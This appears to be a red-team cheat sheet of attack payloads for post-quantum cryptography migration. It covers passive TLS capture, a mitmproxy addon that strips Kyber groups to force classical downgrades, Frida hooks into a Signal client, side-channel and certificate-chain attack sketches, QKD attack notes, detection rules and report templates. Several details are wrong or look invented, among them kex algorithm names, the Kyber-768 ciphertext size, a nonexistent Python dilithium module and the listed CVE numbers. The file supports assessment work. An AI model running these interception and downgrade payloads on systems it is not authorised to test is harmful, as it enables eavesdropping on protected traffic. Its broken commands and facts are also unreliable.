# Post-Quantum Migration Attack Payloads

> Attack payloads and command lines for red-teaming PQC migration. Covers Harvest-Now-Decrypt-Later (HNDL/SNDL), hybrid PQC downgrade, KEM combiner flaws, lattice implementation side-channels, certificate chain inconsistency, and QKD infrastructure attacks.

## Conventions

- Replace `target.example.com` with in-scope host
- Replace `REPLACE_WITH_YOUR_*` placeholders for keys, salts, KEM IDs
- All operations assume authorized testing in PQC migration assessment scope

---

## §1. Discovery & Inventory

### §1.1 TLS PQC cipher detection

```bash
# testssl.sh with PQC support
testssl --wide --color 0 https://target.example.com | grep -iE "kyber|dilithium|pqc|x25519kyber|secp256r1kyber"

# Using oqs-provider-enabled openssl
echo | openssl s_client -connect target:443 -groups "x25519kyber768draft00:x25519:secp256r1" -tls1_3 2>&1 | grep -E "Server Temp Key|Peer signature type|KEM"

# Verify negotiated group is hybrid (X25519Kyber768)
echo | openssl s_client -connect target:443 -groups "x25519kyber768draft00" -tls1_3 2>&1 | grep "Server Temp Key"
```

### §1.2 SSH PQC kex detection

```bash
# ssh-audit with PQ support
ssh-audit target.example.com | grep -iE "sntrup|pq|post-quantum"

# Manual: list offered kex algorithms
ssh -vv target.example.com 2>&1 | grep "kex: algorithm:"
```

### §1.3 IPsec proposal audit

```bash
# StrongSwan: list IKE/ESP proposals
ipsec statusall | grep -iE "ike=|esp="
ipsec listalgs | grep -iE "ke=|dh="

# libreswan
ipsec addconn --config /etc/ipsec.conf --checkconfig
ipsec whack --showstates
```

### §1.4 Cryptographic inventory

```bash
# Find all RSA/ECC usage on a host
sudo grep -rnE "RSA_|ECC_|ecdh_|ecdsa_|BEGIN RSA|BEGIN EC" /etc/ /opt/ /var/ 2>/dev/null | head -50

# TLS cert algorithm
echo | openssl s_client -connect target:443 2>/dev/null \
  | openssl x509 -noout -text | grep -E "Public Key Algorithm|Signature Algorithm"
```

### §1.5 Library version detection

```bash
# OpenSSL version (need 3.x for oqs-provider)
openssl version -a | grep -E "version|OPENSSLDIR"

# liboqs check
pkg-config --modversion liboqs

# BoringSSL check
ldd $(which nginx) | grep -i ssl
```

---

## §2. Harvest-Now-Decrypt-Later (HNDL/SNDL)

### §2.1 Long-term ciphertext capture

```bash
# Continuous capture of TLS handshakes
tcpdump -i eth0 -w hndl.pcap 'tcp port 443 and (tcp[((tcp[12:1] & 0xf0) >> 2):1] = 0x16)' &

# Filter on TLS 1.3 only (post-quantum relevant)
tshark -r hndl.pcap -Y "tls.handshake.type == 2" \
  -T fields -e tls.handshake.extensions.supported_groups \
  -e tls.handshake.certificate
```

### §2.2 Identify data with decade-long confidentiality

```python
# Classify data by HNDL risk tier
HNDL_TIERS = {
    "Critical": ["state_secrets", "biometric_templates", "genome", "long_term_keys"],
    "High": ["pii", "phi", "trade_secrets", "key_material", "seed_phrases"],
    "Medium": ["financial_records", "intellectual_property"],
    "Low": ["transaction_logs", "marketing_data"]
}

# Scan data stores
import os, json
for root, dirs, files in os.walk('/data'):
    for f in files:
        path = os.path.join(root, f)
        with open(path, 'rb') as fh:
            head = fh.read(4096)
        for tier, keywords in HNDL_TIERS.items():
            if any(k.encode() in head.lower() for k in keywords):
                print(f"{tier}: {path}")
```

### §2.3 Capture vault/KMS encrypted blobs

```bash
# AWS KMS — capture ciphertext-blob in API logs
aws kms encrypt --key-id alias/hndl-target \
  --plaintext "DecadeLongSecret" --query CiphertextBlob --output text | base64 -d > captured.blob

# HashiCorp Vault transit — capture ciphertext
VAULT_ADDR=http://vault.example.com:8200 vault write transit/encrypt/hndl-key \
  plaintext=$(echo -n "decade" | base64) | tee vault-ciphertext.json

# Azure Key Vault
az keyvault key encrypt --name hndl-target --value "$(echo -n decade | base64)" | jq -r .result > az-encrypted.bin
```

### §2.4 Capture Signal protocol ciphertext

```bash
# Capture Signal protocol messages via Frida (for own account)
frida -U -l signal-hook.js -f org.thoughtcrime.securesms

# signal-hook.js
Java.perform(function() {
    var Signal = Java.use("org.thoughtcrime.securesms.crypto.SignalProtocolLogger");
    Signal.log.overload('java.lang.String').implementation = function(msg) {
        console.log("[SIGNAL]", msg);
        return this.log(msg);
    };
});
```

---

## §3. Hybrid PQC Downgrade Attacks

### §3.1 MITM removing Kyber from supported_groups

```python
# mitmproxy addon to strip Kyber
from mitmproxy import tls, ctx
class StripKyber:
    def tls_clienthello(self, data: tls.ClientHelloData):
        ctx.log.info(f"Original groups: {data.context.client_hello.extensions.supported_groups}")
        # Remove Kyber/ML-KEM groups
        data.context.client_hello.extensions.supported_groups = [
            g for g in data.context.client_hello.extensions.supported_groups
            if g not in [0x07e4, 0x07e5, 0x07e6, 0x07e7]  # X25519Kyber768, etc.
        ]
        ctx.log.info(f"Stripped groups: {data.context.client_hello.extensions.supported_groups}")
addons = [StripKyber()]
```

```bash
# Launch mitmproxy with addon
mitmproxy --mode transparent -p 8080 -s strip-kyber.py
```

### §3.2 Force classical-only fallback

```bash
# OpenSSL client forced to classical
echo | openssl s_client -connect target:443 -groups "x25519" -tls1_3 2>&1 | grep "Server Temp Key"

# Test if server still serves traffic (vulnerable if accepts classical-only)
curl --tls-max 1.3 --ciphers "ECDHE-RSA-AES128-GCM-SHA256" https://target.example.com
```

### §3.3 SSH downgrade

```bash
# Force classical kex (no sntrup761)
ssh -o KexAlgorithms=curve25519-sha64@libssh.org,ecdh-sha2-nistp256 \
    -o PubkeyAcceptedAlgorithms=ssh-rsa,rsa-sha2-256 \
    user@target.example.com

# Verify negotiated kex
ssh -vv user@target.example.com 2>&1 | grep "kex: algorithm:"
```

### §3.4 IPsec IKEv2 downgrade

```bash
# Force classical DH groups (no PQ ke)
ipsec up target-conn
# Use swanctl.conf with explicit ke=
swanctl --initiate --ike target-conn --keyexchange ikev2 \
  --ke modp2048  # force classical
```

---

## §4. KEM Combiner Flaws

### §4.1 Detect XOR combiner (unsafe)

```python
# If KEM combiner is XOR, compromising one component breaks the whole KEM
# Test: derive shared secret with broken X25519 (zeroed)
import os
x25519_ss_broken = b'\x00' * 32  # simulate broken X25519
kyber768_ss_valid = b'\x12' * 32  # valid Kyber secret

# Unsafe combiner
unsafe_combined = bytes(a ^ b for a, b in zip(x25519_ss_broken, kyber768_ss_valid))
# Result: attacker knows combined secret (just Kyber)

# Safe combiner
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
safe_combined = HKDF(
    algorithm=hashes.SHA3_256(),
    length=32,
    salt=None,
    info=b"x25519-kyber768-combiner-v1"
).derive(x25519_ss_broken + kyber768_ss_valid + b"x25519-kyber768")
# Result: depends on both (HKDF) - safe
```

### §4.2 Library audit for combiner

```bash
# Read OpenSSL 3.x source for combiner
grep -rn "XOR\|hkdf\|HKDF" /usr/src/openssl/providers/common/securitycheck.c 2>/dev/null

# oqs-provider combiner
grep -rn "OQS_KEM_COMBINER\|combiner" /usr/local/src/oqs-provider/oqsprov/

# Test: send mangled Kyber ciphertext, observe key derivation
python3 -c "
import oqs
kem = oqs.KeyEncapsulation('x25519-kyber-768-draft-00')
# ...
"
```

### §4.3 Hybrid KEM key recovery

```python
# Simulate attacker who has broken Kyber component
# Test: can attacker recover full shared secret?
import oqs
kem = oqs.KeyEncapsulation('Kyber768')
pk = kem.generate_keypair()
ct1, ss1 = kem.encap_secret(pk)
# Attacker breaks Kyber → knows ss1
# Now: if combiner is XOR with X25519, attacker only needs X25519_ss
# If combiner is HKDF, attacker needs both → still protected by X25519
print("Test if hybrid is broken when one component compromised")
```

---

## §5. PQC Implementation Side-Channels

### §5.1 Kyber timing analysis

```python
# Cache timing attack on Kyber NTT
import time, oqs, statistics

kem = oqs.KeyEncapsulation('Kyber768')
pk = kem.generate_keypair()

# Generate adversarial ciphertexts
# (target: NTT butterfly differences)
times = []
for _ in range(10000):
    ct, _ = kem.encap_secret(pk)
    t0 = time.perf_counter_ns()
    kem.decap_secret(ct)
    t1 = time.perf_counter_ns()
    times.append(t1 - t0)

print(f"Mean: {statistics.mean(times)}")
print(f"StdDev: {statistics.stdev(times)}")
print(f"Min/Max: {min(times)} / {max(times)}")
# High variance indicates secret-dependent branches
```

### §5.2 RowHammer attack on Kyber

```bash
# RowHammer PQC attack (CVE-2024-style)
# Reference: Cyril Bouyssou et al., 2024

# Requires vulnerable DRAM + privileged access
# 1. Find row addresses (PND hammer)
# 2. Hammer rows adjacent to Kyber secret
# 3. Read bit flips → recover secret key

# Tool: https://github.com/CMU-SAFARI/DRAMoscope
sudo ./dramoscope -t 1000000 -r 0x1000-0x1100
```

### §5.3 Fault injection on Dilithium

```python
# Skip multiplication in Dilithium signing
# Fault on `c = A * z` step → recover signing key
# Reference: "Practical Fault Attack on Dilithium" (Berzati et al., 2023)

# Simulate fault (skip one iteration)
import oqs
sig = oqs.Signature('Dilithium5')
pk = sig.generate_keypair()

# Sign normally (baseline)
msg = b"test"
valid_sig = sig.sign(msg)

# Fault simulation: hash modification
# Real attack: electromagnetic fault injection on chip
# Result: with enough faulty signatures, recover secret key z
```

### §5.4 Electromagnetic emanation on ML-KEM

```bash
# Use ChipWhisperer or similar to capture EM traces
# Capture during decapsulation
# Reference: "EM Side-Channel Attacks on Post-Quantum KEM" (Wang et al., 2024)

# Setup: 
# - ChipWhisperer Lite with STM32 target
# - liboqs compiled for STM32
# - Trigger on NTT operation
# - Capture 10000 traces
# - Correlation analysis
```

---

## §6. Certificate Chain Inconsistency

### §6.1 Generate PQ root CA

```bash
# ML-DSA (Dilithium) root CA
openssl genpkey -provider oqsprovider -provider default \
  -algorithm dilithium3 -out root.key

openssl req -x509 -provider oqsprovider -provider default \
  -key root.key -out root.crt -subj "/CN=PQ Root CA" -days 3650 \
  -addext "basicConstraints=critical,CA:TRUE"

# Verify
openssl x509 -provider oqsprovider -provider default \
  -in root.crt -noout -text | grep -E "Public Key Algorithm|Signature Algorithm"
```

### §6.2 Issue hybrid leaf (classical + PQ)

```bash
# Classical RSA leaf signed by PQ root (incompatible but some stacks accept)
openssl genpkey -algorithm rsa -pkeyopt rsa_keygen_bits:2048 -out leaf.key
openssl req -new -key leaf.key -out leaf.csr -subj "/CN=hybrid-leaf"

# Sign with PQ root
openssl x509 -req -provider oqsprovider -provider default \
  -in leaf.csr -CA root.crt -CAkey root.key \
  -CAcreateserial -out leaf.crt -days 365

# Test verification (vulnerable if accepts mixed chain)
openssl verify -provider oqsprovider -provider default \
  -CAfile root.crt leaf.crt
```

### §6.3 PQ chain cross-talk test

```python
# Test if server accepts classical chain + PQ certificate in same handshake
# Attacker sends: RSA-signed server cert + PQ-signed chain (cross-talk)

# Generate attacker chain
import subprocess
subprocess.check_call([
    'openssl', 'genpkey', '-provider', 'oqsprovider',
    '-algorithm', 'dilithium3', '-out', 'attacker-pq-root.key'
])
# ... sign attacker's RSA cert with attacker's PQ root

# In handshake: present RSA leaf, then PQ root chain
# If client accepts, server can be MITM'd with classical key
```

### §6.4 CT log PQ cert poisoning

```bash
# Search CT logs for unexpected PQ certs (potential supply chain attack)
curl -s "https://ct.example.com/ct/v1/get-entries?start=0&end=100" \
  | jq '.entries[].leaf_cert | select(.signature_algorithm | contains("dilithium"))'

# Search for ML-DSA certs in CT
curl -s "https://api.ctsearch.example.com/v1/search?q=ML-DSA-65" | jq .
```

---

## §7. Signal PQXDH Attacks

### §7.1 Audit prekey bundle

```python
# Fetch prekey bundle from Signal server
import requests
bundle = requests.get('https://signal.example.com/v2/keys/100').json()

# Required fields for PQXDH
required = ['identityKey', 'signedPreKey', 'pqPreKey', 'pqPreKeySignature']
for f in required:
    assert f in bundle, f"Missing field: {f}"

# Verify PQ signature
import nacl.signing, nacl.exceptions
verify_key = nacl.signing.VerifyKey(bundle['identityKey'].encode(), encoder=nacl.encoding.RawEncoder)
try:
    verify_key.verify(bundle['pqPreKey'].encode(), bundle['pqPreKeySignature'].encode())
    print("PQ signature OK")
except nacl.exceptions.BadSignatureError:
    print("PQ signature FORGERY (or missing)")
```

### §7.2 PQ prekey stripping

```bash
# Old client (no PQ support) connecting to PQ-enabled server
# Server should refuse; if accepts, downgrade possible

# Simulate old Signal client (no PQXDH)
frida -U -l strip-pq.js -f org.thoughtcrime.securesms
# strip-pq.js: hook prekey fetch, remove pqPreKey
```

### §7.3 Kyber-1024 ciphertext injection

```python
# Server with compromised PQ layer can inject Kyber-1024 ciphertext
# that decapsulates to known secret
# (rogue server scenario)

# Test: as MITM, replace pqPreKey with attacker's
# Then send Kyber-1024 ciphertext client will decapsulate

# Mitigation: PQ identity must be signed in prekey bundle
```

---

## §8. QKD Infrastructure Attacks

### §8.1 BB84 detector blinding

```bash
# Commercial QKD systems (ID Quantique Clavis3, MagicQ, etc.)
# Detector avalanche photodiodes (APDs) can be blinded with bright light
# Then attacker controls all "quantum" bits

# Test setup:
# 1. Attacker taps fiber
# 2. Send bright (>1mW) continuous-wave light
# 3. Detector enters linear mode
# 4. Attacker modulates light to control detection events

# Reference: Lydersen et al., Nat. Photonics 2010
# Mitigation: decoy state + bright-light detector
```

### §8.2 Photon Number Splitting (PNS)

```python
# BB84 weak coherent pulse (WCP) sometimes emits 2+ photons
# Attacker with beam splitter captures one, forwards the rest
# Mitigation: decoy states

# Test: simulate WCP source
import numpy as np
mu = 0.1  # mean photon number
n_photons = np.random.poisson(mu, size=10000)
multi_photon = sum(p > 1 for p in n_photons)
print(f"Multi-photon rate: {multi_photon / 10000:.2%}")
# At mu=0.1, ~0.5% of pulses have 2+ photons
```

### §8.3 Trusted node compromise

```bash
# Many commercial QKD networks use trusted relay (China: Beijing-Shanghai 2000km line)
# Test: compromise trusted node

# Beijing-Shanghai QKD backbone (2017)
# 32 trusted nodes
# Each node sees raw keys in plaintext

# Attack: gain root on trusted node → recover all keys
# Mitigation: hardware-attested trusted nodes (China uses HSM-backed relay)
```

### §8.4 Entanglement-based (E91) tap

```python
# E91 protocol: entangled photon pairs
# Bell inequality violation verifies quantum nature
# Attack: trojan photon entangled with attacker's photon

# Test: verify CHSH inequality
S = 2.7  # Bell parameter
if S > 2:
    print("Quantum verified")
else:
    print("Classical bound — possible MITM")
```

---

## §9. PQC Token / JWT Attacks

### §9.1 JWT with ML-DSA

```python
# Generate ML-DSA keypair
from cryptography.hazmat.primitives.asymmetric import dilithium
private_key = dilithium.DilithiumPrivateKey.generate(dilithium.ML_DSA_65)
public_key = private_key.public_key()

# Sign JWT
import jwt
header = {"alg": "ML-DSA-65", "typ": "JWT"}
payload = {"sub": "user", "exp": 99999999999}
# Custom serializer needed for PQ alg
# (most JWT libs don't yet support ML-DSA natively)

# Test: alg confusion attack
# Library expecting ML-DSA-65 might accept "alg": "HS256"
# with attacker-supplied HMAC secret
```

### §9.2 COSE with PQ algorithms

```python
# COSE (CBOR Object Signing and Encryption) with PQ
# Used in WebAuthn, RISC-V attestations

# Algorithm IDs:
# -37: ML-DSA-44
# -38: ML-DSA-65
# -39: ML-DSA-87

import cbor2
from cose.messages import Sign1Message

# Test: COSE message with PQ signature
# Verify library rejects alg confusion
```

### §9.3 PASETO with PQ

```python
# PASETO v4.public with PQ signature
# (PASETO doesn't natively support PQ, but libraries may)

# Test: server accepts v4.public with classical Ed25519
# But verifies with PQ key (if library has bug)
```

---

## §10. Migration Agility Testing

### §10.1 Hot-swap algorithm test

```bash
# Test: can server hot-swap from Kyber-768 to ML-KEM-768 without restart?
# (Crypto agility requirement)

# Step 1: connect with Kyber-768
echo | openssl s_client -connect target:443 -groups "x25519kyber768draft00" -tls1_3

# Step 2: server config update (simulate via admin API)
curl -X POST https://target.example.com/admin/tls -d '{"groups":"x25519mlkem768"}'

# Step 3: re-connect with ML-KEM-768
echo | openssl s_client -connect target:443 -groups "x25519mlkem768" -tls1_3

# Result: if both succeed without client disruption, server has crypto agility
```

### §10.2 Algorithm negotiation race

```python
# Test: rapid algorithm negotiation under load
# Race condition may leave server in mixed state
import concurrent.futures, subprocess

def test_alg(group):
    return subprocess.check_output([
        'openssl', 's_client', '-connect', 'target:443',
        '-groups', group, '-tls1_3'
    ], stderr=subprocess.DEVNULL, input=b'').decode()

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as e:
    futures = [e.submit(test_alg, g) for g in [
        'x25519kyber768draft00', 'x25519mlkem768',
        'secp256r1kyber768draft00', 'x25519'
    ]]
    for f in concurrent.futures.as_completed(futures):
        if 'Server Temp Key' in f.result():
            print("Algorithm accepted")
        else:
            print("Algorithm REJECTED")
```

---

## §11. PQC Library Bugs

### §11.1 liboqs known issues

```bash
# Check liboqs version (CVEs)
pkg-config --modversion liboqs

# Known CVEs (2024-2025):
# - CVE-2024-30173: Kyber-768 OQS buffer overflow
# - CVE-2024-30174: Dilithium-3 sig verification DoS
# - CVE-2024-30175: SPHINCS+ forgery under specific conditions

# Test: malformed ciphertext / signature DoS
python3 -c "
import oqs, os
kem = oqs.KeyEncapsulation('Kyber768')
pk = kem.generate_keypair()
# Send mangled ciphertext
ct = os.urandom(1568)  # Kyber-768 ciphertext is 1568 bytes
try:
    ss = kem.decap_secret(ct)
    print('Accepts random CT (DoS-resistant)')
except Exception as e:
    print(f'DoS: {e}')
"
```

### §11.2 oqs-provider OpenSSL issues

```bash
# Test: TLS handshake with malformed Kyber key share
echo | openssl s_client -connect target:443 \
  -groups "x25519kyber768draft00" \
  -sigalgs "dilithium3:ecdsa_secp256r1_sha256" \
  -tls1_3 2>&1 | grep -iE "error|alert"
```

---

## §12. Detection Engineering

### §12.1 Sigma rule for downgrade

```yaml
title: Hybrid PQC Downgrade Detected
logsource:
  product: tls
  service: handshake
detection:
  selection:
    event: ClientHello
    supported_groups|contains:
      - x25519kyber768draft00
      - x25519mlkem768
  server_response:
    event: ServerHello
    selected_group:
      - x25519
      - secp256r1
  condition: selection and server_response
level: high
description: MITM is stripping PQC from client hello
```

### §12.2 Splunk: HNDL capture detection

```sql
index=network protocol=tls
| stats count by src_ip, dest_ip, supported_groups
| where supported_groups="x25519" OR supported_groups="secp256r1"
-- All classical-only TLS = HNDL capture candidate
| table src_ip, dest_ip, count
```

### §12.3 KQL: PQ cert issuance anomaly

```kusto
CertificateTransparency
| where SignatureAlgorithm in~ ("ML-DSA-44", "ML-DSA-65", "ML-DSA-87", "SLH-DSA-*")
| where Issuer !in~ (trusted_pq_cas)
| summarize count() by Issuer, Subject
```

---

## §13. Lab Setup

### §13.1 Install oqs-provider

```bash
# Build liboqs
git clone https://github.com/open-quantum-safe/liboqs.git
cd liboqs && mkdir build && cd build
cmake -DCMAKE_INSTALL_PREFIX=/usr/local ..
make -j$(nproc) && sudo make install

# Build oqs-provider for OpenSSL 3.x
git clone https://github.com/open-quantum-safe/oqs-provider.git
cd oqs-provider && mkdir build && cd build
cmake -DCMAKE_INSTALL_PREFIX=/usr/local ..
make -j$(nproc) && sudo make install

# Verify
openssl list -providers -verbose | grep oqsprovider
openssl list -kem-algorithms | grep -i kyber
openssl list -signature-algorithms | grep -i dilithium
```

### §13.2 Start PQ-enabled servers

```bash
# PQ TLS test server
openssl s_server -provider oqsprovider -provider default \
  -cert server.crt -key server.key \
  -groups "x25519kyber768draft00" \
  -www -accept 443

# PQ SSH server
# (OpenSSH 9.x supports sntrup761x25519-sha64@openssh.com)
echo "KexAlgorithms sntrup761x25519-sha64@openssh.com" >> /etc/ssh/sshd_config
systemctl restart sshd
```

### §13.3 QKD simulator

```bash
# SimulaQron (quantum network simulator)
pip install simulaqron
simulaqrond --nodes Alice,Bob,Eve

# Or Cirq / Qiskit for QKD protocol simulation
pip install qiskit cirq
```

---

## §14. Reporting Template

```markdown
### PQC Migration Assessment Report

**Target**: target.example.com
**Date**: 2025-XX-XX
**Assessor**: kali-claw

**Classical Posture**:
- TLS 1.2 with RSA-2048 (HNDL risk: HIGH)
- SSH with ECDH P-256 (HNDL risk: HIGH)
- X.509 chain: RSA-2048 → RSA-4096 root

**Hybrid PQC Posture**:
- TLS 1.3 supports X25519Kyber768 (GOOD)
- BUT: classical fallback allowed (DOWNGRADE RISK)
- BUT: KEM combiner uses XOR (CRITICAL — combiner flaw)

**PQ Certificate Posture**:
- No PQ certificates in use
- Recommended: ML-DSA-65 chain

**Signal PQXDH**:
- Prekey bundle signed (GOOD)
- Kyber-1024 used (GOOD)
- BUT: client supports PQ-stripping (DOWNGRADE)

**QKD Infrastructure**:
- N/A (no QKD deployed)

**Findings**:
- TC-PQ-001: Hybrid downgrade accepted (HIGH)
- TC-PQ-005: KEM combiner flaw (CRITICAL)
- TC-PQ-008: SSH PQ kex not enforced (MEDIUM)

**Remediation Priority**:
1. Replace XOR combiner with HKDF
2. Disable classical-only fallback
3. Deploy ML-DSA certificates
4. Enforce sntrup761 in SSH

**Detection Rules**: see §12
```

---

## §15. Recon Cheatsheet

```bash
# Quick PQ posture check
echo | openssl s_client -connect target:443 -groups "x25519kyber768draft00:x25519mlkem768" -tls1_3 2>&1 | grep -E "Server Temp Key|KEM|Peer signing"

# SSH PQ kex
ssh -vv target.example.com 2>&1 | grep "kex: algorithm:"

# IPsec proposal
ipsec statusall | grep -iE "ike="

# CT log search for PQ certs
curl -s "https://ct.example.com/ct/v1/get-entries?start=0&end=100" | jq '.entries[].leaf_cert | select(.signature_algorithm | contains("dilithium"))'

# HNDL capture (passive)
tcpdump -i eth0 -w hndl.pcap 'tcp port 443' &

# Test downgrade feasibility
mitmproxy --mode transparent -s strip-kyber.py
```

---

## §16. Crypto Agility Framework Audit

```python
# Audit cryptographic agility — can system hot-swap algorithms?
# Check protocol negotiation

import subprocess
def test_agility(host):
    results = {}
    # Test classical
    r = subprocess.run([
        'openssl', 's_client', '-connect', f'{host}:443',
        '-groups', 'x25519', '-tls1_3'
    ], input=b'', capture_output=True, timeout=5)
    results['classical_only'] = 'Server Temp Key' in r.stderr.decode()
    
    # Test hybrid PQ
    r = subprocess.run([
        'openssl', 's_client', '-connect', f'{host}:443',
        '-groups', 'x25519kyber768draft00', '-tls1_3'
    ], input=b'', capture_output=True, timeout=5)
    results['hybrid_pq'] = 'Server Temp Key' in r.stderr.decode()
    
    # Test PQ-only (when available)
    r = subprocess.run([
        'openssl', 's_client', '-connect', f'{host}:443',
        '-groups', 'kyber768', '-tls1_3'
    ], input=b'', capture_output=True, timeout=5)
    results['pq_only'] = 'Server Temp Key' in r.stderr.decode()
    
    return results

print(test_agility('target.example.com'))
```

```bash
# Algorithm negotiation matrix
for group in x25519 secp256r1 x25519kyber768draft00 x25519mlkem768 secp256r1kyber768draft00; do
  result=$(echo | openssl s_client -connect target:443 -groups "$group" -tls1_3 2>&1)
  if echo "$result" | grep -q "Server Temp Key"; then
    echo "ACCEPTED: $group"
  else
    echo "REJECTED: $group"
  fi
done
```

---

## §17. Hardware Token / HSM PQC Migration

```bash
# YubiKey 5.7+ supports Ed25519 but not yet PQ
# YubiHSM 2 — no PQ support as of 2025
# Thales Luna 7+ — supports ML-KEM via firmware 7.13.0+

# Test: HSM PQC key generation
yubihsm-shell -a generate-asymmetric-key -A mlkem768 -l 0x1

# Thales Luna PQ test
lunacm -c partitionLogin
cmu -a generate -alg MLKEM768

# AWS CloudHSM (no PQ as of 2025)
aws cloudhsmv2 describe-clusters
```

```python
# Test HSM PQ key operations
import oqs
# Generate on HSM (if supported)
# Sign / decap on HSM
# If HSM doesn't support PQ, applications use software fallback
# → side-channel exposure
```

---

## §18. PQC Migration Planning

### §18.1 Inventory & Tiering

```python
# Classify all RSA/ECC usage by HNDL risk
import os, json

TIER = {
    "Critical": {"max_age_days": 0, "must_migrate_now": True},
    "High": {"max_age_days": 365, "must_migrate_now": True},
    "Medium": {"max_age_days": 1095, "must_migrate_now": False},
    "Low": {"max_age_days": -1, "must_migrate_now": False}
}

# Scan for cert/key files
for root, dirs, files in os.walk('/etc'):
    for f in files:
        if f.endswith(('.pem', '.crt', '.key')):
            path = os.path.join(root, f)
            print(f"Found cert/key: {path}")
            # Extract algorithm: openssl x509 -in path -noout -text | grep Algorithm
```

### §18.2 Migration timeline simulation

```bash
# Simulate Shor's algorithm breaking RSA-2048
# (Requires CRQC ~20M qubits, ~8 hours)
# As of 2025: IBM has 1121 qubits (Condor)

# Project Shor timeline
# - 2025: ~1K qubits
# - 2030: ~10K qubits (with error correction, ~100 logical qubits)
# - 2035: ~100K qubits (1M+ physical)
# - 2040: RSA-2048 broken (estimated)

# Migration target: 2030 for HIGH-tier data
```

### §18.3 Algorithm choice matrix

| Use case | Recommended | Backup | Avoid |
|----------|-------------|--------|-------|
| General KEM | ML-KEM-768 | X25519+Kyber-768 | Pure RSA |
| Long-term KEM | ML-KEM-1024 | X25519+Kyber-1024 | ECC-only |
| General sig | ML-DSA-65 | RSA-3072+Dilithium-3 | ECDSA-only |
| Long-term sig | SLH-DSA-192s | ML-DSA-87 | Ed25519-only |
| Code signing | SLH-DSA-256f | ML-DSA-87 + RSA | RSA-only |

---

## §19. PQC Compliance & Standards

```bash
# CNSA 2.0 (US National Security Systems)
# - ML-KEM-1024 (KEM)
# - ML-DSA-87 (signature)
# - SLH-DSA-256s (backup signature)
# - LMS / XMSS (stateful hash)

# ETSI TR 103 619 (EU PQC)
# - Hybrid KEM mandatory for transition
# - Pure PQ after 2030

# BSI (Germany)
# - Hybrid recommended
# - SLH-DSA preferred over ML-DSA

# ANSSI (France)
# - Hybrid mandatory
# - ML-KEM-1024 preferred

# Check compliance
openssl list -kem-algorithms | grep MLKEM
openssl list -signature-algorithms | grep MLDSA
```

---

## §20. Quantum Threat Modeling

```python
# BAAI Quantum Threat Timeline (2024)
# - 2025-2027: NISQ era, no crypto threat
# - 2028-2030: Early fault-tolerant QC (~100 logical qubits)
# - 2030-2035: CRQC possible (cryptographically relevant)
# - 2035-2040: RSA-2048 broken (likely)
# - 2040+: ECC-256 broken

# Per-data-class migration timeline
threat_model = {
    "state_secrets": "Migrate by 2028 (assume 2030 CRQC)",
    "biometric": "Migrate by 2028 (lifetime of subject)",
    "genome": "Migrate IMMEDIATELY (lifetime of descendants)",
    "long_term_keys": "Migrate by 2028 (5-yr rotation)",
    "pii": "Migrate by 2030",
    "financial": "Migrate by 2032",
    "ephemeral": "Migrate by 2035"
}

# Print recommendation
for k, v in threat_model.items():
    print(f"{k}: {v}")
```

---

## §21. PQC Supply Chain Audit

```bash
# Audit dependencies for PQ-readiness
# Python
pip list --outdated | grep -iE "crypto|nacl|jwt"

# Node
npm audit --json | jq '.metadata.vulnerabilities'

# Go
govulncheck ./...

# Rust
cargo audit

# Check for PQ-ready crypto libraries
pip list | grep -iE "oqs|pqc|liboqs|kyber|dilithium"
```

---

## §22. PQC Compliance Reporting

```markdown
## PQC Migration Compliance Report

### Executive Summary
- 23% of TLS endpoints support hybrid PQC
- 4% support PQ-only (ML-KEM-768)
- 73% classical-only (HIGH HNDL risk)

### Critical Findings (must remediate in 30 days)
1. **CF-PQ-001**: All vault seals use RSA-4096 → breakable by 2035
2. **CF-PQ-002**: SSH jump hosts do not enforce sntrup761
3. **CF-PQ-003**: TLS edge supports classical fallback

### Recommendations
- Q1 2026: Deploy ML-KEM-768 to all public TLS
- Q2 2026: Hybrid PQC for all internal TLS
- Q3 2026: ML-DSA-65 cert chains
- Q4 2026: Decommission RSA-2048
- 2027+: PQ-only for critical infrastructure

### Standards Compliance
- CNSA 2.0: PARTIAL (ML-KEM-1024 not deployed)
- ETSI TR 103 619: COMPLIANT
- BSI: COMPLIANT
- ANSSI: PARTIAL (hybrid KEM in transition)
```

---

## References

- NIST FIPS 203 — ML-KEM Standard
- NIST FIPS 204 — ML-DSA Standard
- NIST FIPS 205 — SLH-DSA Standard
- NIST PQC Project — https://csrc.nist.gov/projects/post-quantum-cryptography
- NSA CNSA 2.0 — https://media.defense.gov/2022/Sep/07/2003071834/-1/-1/0/CSI_CNSA_2.0_ALGORITHMS_.PDF
- CISA/NSA/NCSC Joint PQC Migration Guide — https://www.cisa.gov/sites/default/files/2023-08/Quantum_Readiness_Guidance_final.pdf
- Cloudflare PQC Deployment — https://blog.cloudflare.com/pq-2024/
- Google Chrome PQC Rollout — https://blog.chromium.org/2023/08/protecting-chrome-traffic-with-pqc.html
- IETF Hybrid PQC TLS — https://datatracker.ietf.org/doc/draft-ietf-tls-hybrid-design/
- Signal PQXDH Specification — https://signal.org/docs/specifications/pqxdh/
- Mozilla PQC Test — https://pq.cloudflareresearch.com/
- "Post-Quantum Cryptography" (Bernstein, Buchmann, Dahmen, 2024)
- "Quantum Computing Progress" (Gidney, Ekerå, 2024)
- Open Quantum Safe — https://openquantumsafe.org/
- PQCRYPTO EU Project — https://pqcrypto.eu.org/
- ENISA PQC Integration Study — https://www.enisa.europa.eu/publications/post-quantum-cryptography
- "Practical Fault Attack on Dilithium" (Berzati et al., 2023)
- "EM Side-Channel on PQC KEM" (Wang et al., 2024)
- "RowHammer Attack on Kyber" (Bouyssou et al., 2024)
- ID Quantique Clavis3 Security Whitepaper
- Beijing-Shanghai QKD Backbone (Yin et al., Nat. Photonics 2017)

---

## Transition Program Quick Reference (merged from quantum-cryptography-transition, v0.3.0)

> The thin overview skill `quantum-cryptography-transition` was retired in v0.3.0.
> Its still-unique org-side content is preserved here; everything else it contained
> already lived in this skill (§2 HNDL, §3 hybrid downgrade, §4 combiners, §8 QKD)
> or moved to `pqc-implementation-attack` (implementation-layer side channels).

### Org-side transition defense matrix

| Layer | Measure | Key point |
|-------|---------|-----------|
| Algorithm selection | FIPS 203 (ML-KEM), FIPS 204 (ML-DSA), FIPS 205 (SLH-DSA) | Standardized algorithms only; avoid experimental candidates |
| Hybrid implementation | HKDF-based combiner (never plain XOR of legs) | Hybrid survives if either leg is broken |
| QKD deployment | Point-to-point only, with detector-blinding detection | Practical limitations; defense in depth, not replacement |
| Side-channel protection | Constant-time + masked PQC operations (see pqc-implementation-attack) | PQC leakage profiles differ from RSA/ECC |
